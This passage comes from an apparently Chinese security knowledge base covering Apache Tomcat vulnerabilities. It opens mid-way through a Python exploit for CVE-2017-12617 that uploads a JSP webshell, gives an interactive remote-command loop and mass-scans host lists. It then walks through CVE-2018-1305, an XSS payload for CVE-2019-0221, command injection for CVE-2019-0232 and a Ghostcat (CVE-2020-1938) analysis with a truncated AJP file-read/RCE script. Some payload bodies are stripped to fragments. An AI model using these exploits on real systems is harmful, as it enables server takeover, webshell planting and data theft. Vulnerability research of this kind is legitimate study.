/ ____| |__ \\ / _ \\/_ |____ | /_ |__ \\ / //_ |____ | | | \\ \\ / /| |__ ______ ) | | | || | / /_____| | ) / /_ | | / / | | \\ \\/ / | __|______/ /| | | || | / /______| | / / '_ \\| | / / | |____ \\ / | |____ / /_| |_| || | / / | |/ /| (_) | | / / \\_____| \\/ |______| |____|\\___/ |_|/_/ |_|____\\___/|_|/_/ [@intx0x80] \"\"\" def signal_handler(signal, frame): print (\"\\033[91m\"+\"\\n[-] Exiting\"+\"\\033[0m\") exit() signal.signal(signal.SIGINT, signal_handler) def removetags(tags): remove = re.compile('') txt = re.sub(remove, '\\n', tags) return txt.replace(\"\\n\\n\\n\",\"\\n\") def getContent(url,f): headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'} requests.packages.urllib3.disable_warnings() re=requests.get(str(url)+\"/\"+str(f), headers=headers,verify=False) return re.content def createPayload(url,f): evil='' headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'} requests.packages.urllib3.disable_warnings() req=requests.put(str(url)+str(f)+\"/\",data=evil, headers=headers,verify=False) if req.status_code==201: print \"File Created ..\" def RCE(url,f): EVIL=\"\"\"\"\"\".format(f)+\"\"\" \"; } } catch(IOException e) { e.printStackTrace(); } } %> \"\"\" headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'} requests.packages.urllib3.disable_warnings() req=requests.put(str(url)+f+\"/\",data=EVIL, headers=headers,verify=False) def shell(url,f): while True: headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'} cmd=raw_input(\"$ \") payload={'cmd':cmd} if cmd==\"q\" or cmd==\"Q\": break requests.packages.urllib3.disable_warnings() re=requests.get(str(url)+\"/\"+str(f),params=payload,headers=headers,verify=False) re=str(re.content) t=removetags(re) print t #print bcolors.HEADER+ banner+bcolors.ENDC parse=OptionParser( bcolors.HEADER+\"\"\" _______ ________ ___ ___ __ ______ __ ___ __ __ ______ / ____\\ \\ / / ____| |__ \\ / _ \\/_ |____ | /_ |__ \\ / //_ |____ | | | \\ \\ / /| |__ ______ ) | | | || | / /_____| | ) / /_ | | / / | | \\ \\/ / | __|______/ /| | | || | / /______| | / / '_ \\| | / / | |____ \\ / | |____ / /_| |_| || | / / | |/ /| (_) | | / / \\_____| \\/ |______| |____|\\___/ |_|/_/ |_|____\\___/|_|/_/ ./cve-2017-12617.py [options] options: -u ,--url [::] check target url if it's vulnerable -p,--pwn [::] generate webshell and upload it -l,--list [::] hosts list [+]usage: ./cve-2017-12617.py -u http://127.0.0.1 ./cve-2017-12617.py --url http://127.0.0.1 ./cve-2017-12617.py -u http://127.0.0.1 -p pwn ./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn ./cve-2017-12617.py -l hotsts.txt ./cve-2017-12617.py --list hosts.txt [@intx0x80] \"\"\"+bcolors.ENDC ) parse.add_option(\"-u\",\"--url\",dest=\"U\",type=\"string\",help=\"Website Url\") parse.add_option(\"-p\",\"--pwn\",dest=\"P\",type=\"string\",help=\"generate webshell and upload it\") parse.add_option(\"-l\",\"--list\",dest=\"L\",type=\"string\",help=\"hosts File\") (opt,args)=parse.parse_args() if opt.U==None and opt.P==None and opt.L==None: print(parse.usage) exit(0) else: if opt.U!=None and opt.P==None and opt.L==None: print bcolors.OKGREEN+banner+bcolors.ENDC url=str(opt.U) checker=\"Poc.jsp\" print bcolors.BOLD +\"Poc Filename {}\".format(checker) createPayload(str(url)+\"/\",checker) con=getContent(str(url)+\"/\",checker) if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con: print bcolors.WARNING+url+' it\\'s Vulnerable to CVE-2017-12617'+bcolors.ENDC print bcolors.WARNING+url+\"/\"+checker+bcolors.ENDC else: print 'Not Vulnerable to CVE-2017-12617 ' elif opt.P!=None and opt.U!=None and opt.L==None: print bcolors.OKGREEN+banner+bcolors.ENDC pwn=str(opt.P) url=str(opt.U) print \"Uploading Webshell .....\" pwn=pwn+\".jsp\" RCE(str(url)+\"/\",pwn) shell(str(url),pwn) elif opt.L!=None and opt.P==None and opt.U==None: print bcolors.OKGREEN+banner+bcolors.ENDC w=str(opt.L) f=open(w,\"r\") print \"Scaning hosts in {}\".format(w) checker=\"Poc.jsp\" for i in f.readlines(): i=i.strip(\"\\n\") createPayload(str(i)+\"/\",checker) con=getContent(str(i)+\"/\",checker) if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con: print str(i)+\"\\033[91m\"+\" [ Vulnerable ] \"\"\\033[0m\" Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:48 "},"Web安全/Tomcat/（CVE-2018-1305）Tomcat 安全绕过漏洞/（CVE-2018-1305）Tomcat 安全绕过漏洞.html":{"url":"Web安全/Tomcat/（CVE-2018-1305）Tomcat 安全绕过漏洞/（CVE-2018-1305）Tomcat 安全绕过漏洞.html","title":"（CVE-2018-1305）Tomcat 安全绕过漏洞","keywords":"","body":"（CVE-2018-1305）Tomcat 安全绕过漏洞 一、漏洞简介 近日，Apache发布安全公告称Apache Tomcat 7、8、9多个版本存在安全绕过漏洞。攻击者可以利用这个问题，绕过某些安全限制来执行未经授权的操作，这可能有助于进一步攻击。 Apache Tomcat servlet 注释定义的安全约束，只在servlet加载后才应用一次。由于以这种方式定义的安全约束，应用于URL模式及该点下任何URL，很可能取决于servlet加载的次序，这可能会将资源暴露给未经授权访问它们的用户。 二、漏洞影响 Apache Tomcat \\ Apache Tomcat \\ Apache Tomcat \\ Apache Tomcat \\ 三、复现过程 Java EE 提供了类似 ACL 权限检查的ServletSecurity注解，可以用于修饰Servlet对其进行保护，如果有两个servlet，Servlet1，访问路径为\"/servlet1/\"并且添加了ServletSecurity注解，Servlet2，访问路径为\"/servlet1/servlet2/\"但没有ServletSecurity注解，首次访问servlet1/servlet2，servlet1的ServletSecurity注解并不会生效，无法保护\"/servlet1/servlet2\"路径，因此可能会导致未授权访问。 如果在访问\"/servlet1/servlet2\"之前先访问过\"/servlet1\"，Tomcat会加载ACL并启动对\"/servlet1/servlet2\"的保护，则漏洞不会触发。 Tomcat安全绕过漏洞/media/rId24.jpg) 在Servlet1前加上ServletSecurity注解，Servlet2无此注解。 Tomcat安全绕过漏洞/media/rId25.jpg) 将web.xml文件中servlet相对应的url-pattern修改为如下图所示后。 Tomcat安全绕过漏洞/media/rId26.jpg) 运行该项目。首次访问servlet2的URL，发现可以未授权访问，针对servlet1的ACL并未生效。 http://localhost:8080/CVE-2018-1305/servlet1/servlet2/ Tomcat安全绕过漏洞/media/rId28.jpg) 第二次访问servlet1的URL，访问被禁止，此时ACL生效。 http://localhost:8080/CVE-2018-1305/servlet1/ Tomcat安全绕过漏洞/media/rId30.jpg) 再次访问servlet2的URL，发现访问被禁止，如果ACL对servlet2生效，必须建立在servlet1被访问过的前提下。 http://localhost:8080/CVE-2018-1305/servlet1/servlet2/ Tomcat安全绕过漏洞/media/rId31.jpg) 漏洞演示 Tomcat安全绕过漏洞/media/rId33.gif) 因此漏洞的复现仅限于Tomcat启动后，在访问\"/servlet1/\"之前先访问了\"/servlet1/servlet2/\"页面，若之前存在任何人访问\"/servlet1/*\"页面，则漏洞不会触发。漏洞危害较高，但是利用条件困难，因此影响范围并不大。 参考链接 http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1305 http://blog.nsfocus.net/cve-2018-130-handling/ https://www.anquanke.com/post/id/99213 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:49 "},"Web安全/Tomcat/（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS/（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS.html":{"url":"Web安全/Tomcat/（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS/（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS.html","title":"（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS","keywords":"","body":"（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS 一、漏洞简介 Apache Tomcat在其SSI实现中存在漏洞，可用于实现跨站点脚本（XSS）。只有在启用SSI并使用\"printenv\"指令的情况下，才能利用此漏洞。 利用条件 必须在Apache Tomcat中启用SSI支持 - 全局或特定Web应用程序。默认情况下不启用。 Web应用程序中必须存在具有\"printenv\"SSI指令的文件(通常为\".shtml\")。 攻击者必须能够访问该文件。 二、漏洞影响 Apache Tomcat 9.0.0.M1版本至9.0.0.17版本、 Apache Tomcat 8.5.0版本至8.5.39版本 Apache Tomcat 7.0.0版本至7.0.93版本 三、复现过程 漏洞分析 服务器端包含(SSI)是一些Web服务器中使用的一种简单的脚本语言，用于实现包括文件、变量的值回显和显示有关文件的基本信息等功能。这些只是针对于SSI特定的环境变量，它们要么由用户设置，要么包含关于传入HTTP请求的信息。（请参阅此处的完整列表）。\"echo\"指令打印出单个变量的值，而\"printenv\"指令打印出所有变量的值。这两个指令都输出HTML。Apache Tomcat对于使用\"echo\"指令时正确地转义了XSS值，但对于\"printenv\"指令则没有。因此，如果应用程序使用这个指令，攻击者可以注入恶意输入，从而导致XSS。比较\"echo\"参数中正确转义输出的代码： ApacheTomcatSSIprintenv指令中的XSS/media/rId27.png) 与未对输出进行正确转义的\"printenv\"参数的代码相比： ApacheTomcatSSIprintenv指令中的XSS/media/rId28.png) 修复方法是添加如下提交中所示的编码： ApacheTomcatSSIprintenv指令中的XSS/media/rId30.png) 漏洞复现 1.在Windows中安装Java运行时环境(JRE)。 2.下载有漏洞的Tomcat版本并解压。 3.在第19行修改conf\\context.xml文件，获得上下文权限（(这也可以在单个应用程序上执行，而不是全局执行） Context privileged =“true”> 4.根据这里的指令修改conf\\web.xml以启用SSI servlet(这也可以在单独的应用程序上完成，也可以是全局的)。 5.将以下代码放在\"webapps / ROOT / ssi / printenv.shtml\"中： Echo test: Printenv test: 6通过以下命令运行Tomcat： cd bin catalina run 7.利用以下URL来触发XSS(可能需要使用Firefox)。观察正确转义的\"echo\"指令与无法正确转义的\" printenv \"指令之间的区别 http://www.0-sec.org:8080/ssi/printenv.shtml?%3Cbr/%3E%3Cbr/%3E%3Ch1%3EXSS%3C/h1%3E%3Cbr/%3E%3Cbr/%3E http://www.0-sec.org:8080/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E ApacheTomcatSSIprintenv指令中的XSS/media/rId33.png) ApacheTomcatSSIprintenv指令中的XSS/media/rId34.png) 参考链接 https://xz.aliyun.com/t/5310 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:51 "},"Web安全/Tomcat/（CVE-2019-0232）Tomcat rce/（CVE-2019-0232）Tomcat rce.html":{"url":"Web安全/Tomcat/（CVE-2019-0232）Tomcat rce/（CVE-2019-0232）Tomcat rce.html","title":"（CVE-2019-0232）Tomcat rce","keywords":"","body":"（CVE-2019-0232）Tomcat rce 一、漏洞简介 该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。 该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。 二、漏洞影响 Apache Tomcat 9.0.0.M1 to 9.0.17 Apache Tomcat 8.5.0 to 8.5.39 Apache Tomcat 7.0.0 to 7.0.93 三、复现过程 漏洞分析 漏洞相关的代码在 tomcat\\java\\org\\apache\\catalina\\servlets\\CGIServlet.java 中，CGIServlet提供了一个cgi的调用接口，在启用 enableCmdLineArguments 参数时，会根据RFC 3875来从Url参数中生成命令行参数，并把参数传递至Java的 Runtime 执行。 这个漏洞是因为 Runtime.getRuntime().exec 在Windows中和Linux中底层实现不同导致的。下面以一个简单的case来说明这个问题，在Windows下创建arg.bat： rem arg.bat echo %* 并执行如下的Java代码 String [] cmd={\"arg.bat\", \"arg\", \"&\", \"dir\"}; Runtime.getRuntime().exec(cmd); 在Windows下会输出 arg 和 dir 命令运行后的结果。同样的，用类似的脚本在Linux环境下测试： # arg.sh for key in \"$@\" do echo '$@' $key done String [] cmd={\"arg.sh\", \"arg\", \"&\", \"dir\"}; Runtime.getRuntime().exec(cmd); 此时的输出为 $@ arg $@ & $@ dir 导致这种输出的原因是在JDK的实现中 Runtime.getRuntime().exec 实际调用了 ProcessBuilder ，而后 ProcessBuilder 调用 ProcessImpl使用系统调用 vfork ，把所有参数直接传递至 execve。 用 strace -F -e vfork,execve java Main 跟踪可以看到上面的Java代码在Linux中调用为 execve(\"arg.sh\", [\"arg.sh\", \"arg\", \"&\", \"dir\"], [/* 23 vars */]) 而如果跟踪类似的PHP代码 system('a.sh arg & dir'); ，得到的结果为 execve(\"/bin/sh\", [\"sh\", \"-c\", \"a.sh arg & dir\"], [/* 23 vars */]) 所以Java的 Runtime.getRuntime().exec 在CGI调用这种情况下很难有命令注入。而Windows中创建进程使用的是 CreateProcess ，会将参数合并成字符串，作为 lpComandLine 传入 CreateProcess 。程序启动后调用 GetCommandLine 获取参数，并调用 CommandLineToArgvW 传至 argv。在Windows中，当 CreateProcess 中的参数为 bat 文件或是 cmd 文件时，会调用 cmd.exe , 故最后会变成 cmd.exe /c \"arg.bat & dir\"，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞。 除此之外，Windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过， 例如 dir \"\\\"&whoami\" 在Linux中是安全的，而在Windows会执行命令。 这是因为Windows在处理命令行参数时，会将 \" 中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 \" ，但是对 \\\" 的处理有误。同样用 arg.bat 做测试，可以发现这里只输出了 \\ 。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检查才能避免漏洞出现。 漏洞复现 笔者使用的复现环境为9.0.12 + JRE 1.8.0。 首先进行CGI相关的配置，在 conf/web.xml 中启用CGIServlet： cgi org.apache.catalina.servlets.CGIServlet cgiPathPrefix WEB-INF/cgi-bin enableCmdLineArguments true executable 5 这里主要的设置是 enableCmdLineArguments 和 executable 两个选项。 enableCmdLineArguments 启用后才会将Url中的参数传递到命令行， executable 指定了执行的二进制文件，默认是 perl，需要置为空才会执行文件本身。 同样在 conf/web.xml 中启用cgi的servlet-mapping cgi /cgi-bin/* 之后修改 conf/context.xml 的 ` 添加privileged=\\\"true\\\"`属性，否则会没有权限 WEB-INF/web.xml WEB-INF/tomcat-web.xml ${catalina.base}/conf/web.xml --> 然后在 ROOT\\WEB-INF 下创建 cgi-bin 目录, 并在该目录下创建一个内容为 echo Content-type: text/html 的 e.bat 文件。 配置完成后，启动tomcat，访问 http://0-sec.org:8080/cgi-bin/e.bat?&ver ，可以看到命令执行成功。 参考链接 https://xz.aliyun.com/t/4875 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:53 "},"Web安全/Tomcat/（CVE-2020-1938）Apache Tomcat 文件包含漏洞/（CVE-2020-1938）Apache Tomcat 文件包含漏洞.html":{"url":"Web安全/Tomcat/（CVE-2020-1938）Apache Tomcat 文件包含漏洞/（CVE-2020-1938）Apache Tomcat 文件包含漏洞.html","title":"（CVE-2020-1938）Apache Tomcat 文件包含漏洞","keywords":"","body":"（CVE-2020-1938）Apache Tomcat 文件包含漏洞 一、漏洞简介 对于处在漏洞影响版本范围内的 Tomcat 而言，若其开启 AJP Connector 且攻击者能够访问 AJP Connector 服务端口的情况下，即存在被 Ghostcat 漏洞利用的风险。 注意 Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009 二、漏洞影响 Apache Tomcat 6 Apache Tomcat 7 \\ Apache Tomcat 8 \\ Apache Tomcat 9 \\ 三、复现过程 漏洞分析 由于 AJP 并不是一个 HTTP 业务流，走的是 Socket ，所以 tomcat 前面接收业务流的时候调用的是一个 Socket 解析类 SocketProcessorBase#dorun 来处理 ajp 传入的二进制流。 ApacheTomcat文件包含漏洞/media/rId25.png) 而后面这部分的数据流实际上都是 socket 内部进行流传处理。 ApacheTomcat文件包含漏洞/media/rId26.png) 这里需要感谢 tomcat 优雅的代码风格，可读性真强，和 socket 相关的 service 就下图里面的这些，所以AJP的业务流自然就落在了org/apache/coyote/ajp/AjpProcessor#service这个方法上面进行处理。 ApacheTomcat文件包含漏洞/media/rId27.png) 这org/apache/coyote/ajp/AjpProcessor#service这个方法里面就留两个关键部分，其他代码太繁杂了，无关大雅，这里首先this.prepareRequest()方法是针对整个业务流进行预处理。 Copy to clipboard public SocketState service(SocketWrapperBase socket) throws IOException { ... while(!this.getErrorState().isError() && !this.endpoint.isPaused()) { try { ... if (this.getErrorState().isIoAllowed()) { rp.setStage(2); try { this.prepareRequest(); } catch (Throwable var12) { ... if (this.getErrorState().isIoAllowed()) { try { rp.setStage(3); this.getAdapter().service(this.request, this.response); } ... } 跟进 prepareRequest 方法，这个方法会进行一个 while 为 true 的无限循环，根据attributeCode的结果进行选择，命中 case 10 核心中有个request.setAttribute(n, v)方法，这个方法会从我们之前设置方法中取值，设置，遍历循环POC中的javax.servlet.include.request_uri，javax.servlet.include.path_info，javax.servlet.include.servlet_path这三个属性对应的值，并且通过PUT方法进行赋值。 Copy to clipboard private void prepareRequest() { ... while(true) { byte attributeCode; while((attributeCode = this.requestHeaderMessage.getByte()) != -1) { switch(attributeCode) { ... case 10: ... } else { this.request.setAttribute(n, v); } break; ApacheTomcat文件包含漏洞/media/rId28.png) 好了，这里知道了在 prepareRequest 方法中核心是将三个值动态赋予我们想要的结果，再回到org/apache/coyote/ajp/AjpProcessor#service中，在经过 prepareRequest 方法处理之后来到的就是getAdapter().service(this.request, this.response);，这个 serivce 就是后续处理 request 对象和 response 对象了。 ApacheTomcat文件包含漏洞/media/rId29.png) 在 org/apache/catalina/connector/CoyoteAdapter#service 这个类中，主要是设置一些连接的时候一些属性，然后通过 invoke 反射方法，根据 request 对象和 response 对象进入后面的HTTP处理逻辑。 ApacheTomcat文件包含漏洞/media/rId30.png) ApacheTomcat文件包含漏洞/media/rId31.png) 所以又回到了前面的老话，tomcat完善的代码结构，HTTP的逻辑服务处理，自然是落在了 javax/servlet/http/HttpServlet#service 当中。 ApacheTomcat文件包含漏洞/media/rId32.png) 任意文件读取 前面是整个 AJP->HTTP 整个过程，继续往下跟入，因为通过 AJP 转换之后，进行的是 HTTP GET 请求，所以来到的自然是是下图中代码位置。 ApacheTomcat文件包含漏洞/media/rId34.png) 跟进 doGet 自然来到之前安恒通告说的地方。 ApacheTomcat文件包含漏洞/media/rId35.png) 继续跟入 serveResource，首先 getRelativePath 从之前传入的 request 对象中获取 path 。 ApacheTomcat文件包含漏洞/media/rId36.png) 跟进 getRelativePath ，一眼就知道为什么要设置 request_uri 、path_info 、servlet_path 这三个属性了，通过路径的拼接，最后返回的 servletPath 为/，容器内部为 /WEB-INF/web.xml 的文件内容。 ApacheTomcat文件包含漏洞/media/rId37.png) 继续回到 serveResource 方法中 getResource 根据前面的 path 也就是 /WEB-INF/web.xml 进行资源获取。而这里是没办法../出去的，原因继续往下看。 ApacheTomcat文件包含漏洞/media/rId38.png) 在 getResource 当中有个 validate ，这个检查往后走会调用 normalize 进行目录遍历的检查，之后就是输出读到的内容了。 ApacheTomcat文件包含漏洞/media/rId39.png) ApacheTomcat文件包含漏洞/media/rId40.png) 由于当前 AJP 出不了 webapps 目录，但是是可以做到任意目录下读的，比如我需要读 /example/2.txt 下的文件，只需要这样配置就好了。 Copy to clipboard {'name':'req_attribute','value':['javax.servlet.include.request_uri','/examples']}, {'name':'req_attribute','value':['javax.servlet.include.path_info',2.txt]}, {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']}, ]) ApacheTomcat文件包含漏洞/media/rId41.png) 附上任意文件读取的调用栈 Copy to clipboardserveResource:839, DefaultServlet (org.apache.catalina.servlets) doGet:504, DefaultServlet (org.apache.catalina.servlets) service:634, HttpServlet (javax.servlet.http) service:484, DefaultServlet (org.apache.catalina.servlets) service:741, HttpServlet (javax.servlet.http) internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) doFilter:52, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) invoke:199, StandardWrapperValve (org.apache.catalina.core) invoke:96, StandardContextValve (org.apache.catalina.core) invoke:493, AuthenticatorBase (org.apache.catalina.authenticator) invoke:137, StandardHostValve (org.apache.catalina.core) invoke:81, ErrorReportValve (org.apache.catalina.valves) invoke:660, AbstractAccessLogValve (org.apache.catalina.valves) invoke:87, StandardEngineValve (org.apache.catalina.core) service:343, CoyoteAdapter (org.apache.catalina.connector) service:476, AjpProcessor (org.apache.coyote.ajp) process:66, AbstractProcessorLight (org.apache.coyote) process:808, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1498, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1142, ThreadPoolExecutor (java.util.concurrent) run:617, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) RCE Copy to clipboard\"HTTP/1.1\" \"/1.jsp\" 127.0.0.1 localhost porto 8009 false \"Cookie:AAAA=BBBB\" \"javax.servlet.include.request_uri:/\",\"javax.servlet.include.path_info:1.txt\",\"javax.servlet.include.servlet_path:/upload/\" org/apache/jasper/servlet/JspServlet#service负责处理xxx.jsp访问逻辑，跟进来 jspUri 是通过 servlet_path 和 path_info 拼接而来的。 ApacheTomcat文件包含漏洞/media/rId43.png) 之后便会进入 serviceJspFile 逻辑进行处理。 ApacheTomcat文件包含漏洞/media/rId44.png) 跟进 serviceJspFile 方法，首先先通过 getResource 获取上传文件的内容，然后再通过初始化 wrapper 对象传入相关参数，然后再调用 JspServletWrapper#service 进行解析。 ApacheTomcat文件包含漏洞/media/rId45.png) 这简单解释一下，RCE 的核心需要进入的 JspServlet ，我们平常访问 xxx.jsp 是进入到 Jspservlet ，poc中访问/1.jsp通过 AJP 发包的过程中实际上就是我们的Get请求访问www.xxx.com/1.jsp，所以这里自然进入了 JspServlet 当中，然后再配合 getResource 获取上传的文件内容，调用 Jsp 引擎进行解析，自然达到了RCE的效果。 最后附上RCE的调用栈 Copy to clipboardexec:347, Runtime (java.lang) _jspService:1, _1_txt (org.apache.jsp) service:70, HttpJspBase (org.apache.jasper.runtime) service:741, HttpServlet (javax.servlet.http) service:476, JspServletWrapper (org.apache.jasper.servlet) serviceJspFile:386, JspServlet (org.apache.jasper.servlet) service:330, JspServlet (org.apache.jasper.servlet) service:741, HttpServlet (javax.servlet.http) internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) doFilter:52, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) invoke:199, StandardWrapperValve (org.apache.catalina.core) invoke:96, StandardContextValve (org.apache.catalina.core) invoke:493, AuthenticatorBase (org.apache.catalina.authenticator) invoke:137, StandardHostValve (org.apache.catalina.core) invoke:81, ErrorReportValve (org.apache.catalina.valves) invoke:660, AbstractAccessLogValve (org.apache.catalina.valves) invoke:87, StandardEngineValve (org.apache.catalina.core) service:343, CoyoteAdapter (org.apache.catalina.connector) service:476, AjpProcessor (org.apache.coyote.ajp) process:66, AbstractProcessorLight (org.apache.coyote) process:808, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1498, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1142, ThreadPoolExecutor (java.util.concurrent) run:617, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) 后话 我试了一下jsp的文件包含，这个demo下也是可以的，所以实际上RCE就是jsp的文件包含搞的鬼，要先上传一个文件，这个文件路径可被包含，然后读取模版解析，最后RCE。 Copy to clipboard//1.jsp //1.txt 另外前面可能有师傅会问为什么是GET，原因是下面这个POC有forwardrequest 2，根据AJP数据包格式第6个字节(02)代表是Get请求。另外在Tomcat中也有相关映射关系，在 AjpProcessor 做 prepareRequest 处理的时候会根据字节选择相关的请求方式。 ApacheTomcat文件包含漏洞/media/rId46.png) poc (py27)> python .\\cve-2020-1938-poc.py -h usage: cve-2020-1938-poc.py [-h] [-p PORT] [-w WEBAPP] [-f FILE] [-l] target positional arguments: target Hostname or IP to attack optional arguments: -h, --help show this help message and exit -p PORT, --port PORT AJP port to attack (default is 8009) -w WEBAPP, --webapp WEBAPP Which webapp to attack (default is ROOT -f FILE, --file FILE file path :(WEB-INF/web.xml) -l, --lfi local file include python2.7 #!/usr/bin/env python # CNVD-2020-10487 Tomcat-Ajp lfi # Based on: https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/ # # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html import socket import struct import argparse def pack_string(s): if s is None: return struct.pack(\">h\", -1) l = len(s) return struct.pack(\">H%dsb\" % l, l, s.encode('utf8'), 0) def unpack(stream, fmt): size = struct.calcsize(fmt) buf = stream.read(size) return struct.unpack(fmt, buf) def unpack_string(stream): size, = unpack(stream, \">h\") if size == -1: # null string return None res, = unpack(stream, \"%ds\" % size) stream.read(1) # \\0 return res class NotFoundException(Exception): pass class AjpBodyRequest(object): # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) MAX_REQUEST_LENGTH = 8186 def __init__(self, data_stream, data_len, data_direction=None): self.data_stream = data_stream self.data_len = data_len self.data_direction = data_direction def serialize(self): data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH) if len(data) == 0: return struct.pack(\">bbH\", 0x12, 0x34, 0x00) else: res = struct.pack(\">H\", len(data)) res += data if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbH\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbH\", 0x41, 0x42, len(res)) return header + res def send_and_receive(self, socket, stream): while True: data = self.serialize() socket.send(data) r = AjpResponse.receive(stream) while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS: r = AjpResponse.receive(stream) if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4: break class AjpForwardRequest(object): _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range( 28) REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE} # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) COMMON_HEADERS = [\"SC_REQ_ACCEPT\", \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\", \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\", \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"] def __init__(self, data_direction=None): self.prefix_code = 0x02 self.method = None self.protocol = None self.req_uri = None self.remote_addr = None self.remote_host = None self.server_name = None self.server_port = None self.is_ssl = None self.num_headers = None self.request_headers = None self.attributes = None self.data_direction = data_direction def pack_headers(self): self.num_headers = len(self.request_headers) res = \"\" res = struct.pack(\">h\", self.num_headers) for h_name in self.request_headers: if h_name.startswith(\"SC_REQ\"): code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1 res += struct.pack(\"BB\", 0xA0, code) else: res += pack_string(h_name) res += pack_string(self.request_headers[h_name]) return res def pack_attributes(self): res = b\"\" for attr in self.attributes: a_name = attr['name'] code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1 res += struct.pack(\"b\", code) if a_name == \"req_attribute\": aa_name, a_value = attr['value'] res += pack_string(aa_name) res += pack_string(a_value) else: res += pack_string(attr['value']) res += struct.pack(\"B\", 0xFF) return res def serialize(self): res = \"\" res = struct.pack(\"bb\", self.prefix_code, self.method) res += pack_string(self.protocol) res += pack_string(self.req_uri) res += pack_string(self.remote_addr) res += pack_string(self.remote_host) res += pack_string(self.server_name) res += struct.pack(\">h\", self.server_port) res += struct.pack(\"?\", self.is_ssl) res += self.pack_headers() res += self.pack_attributes() if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbh\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbh\", 0x41, 0x42, len(res)) return header + res def parse(self, 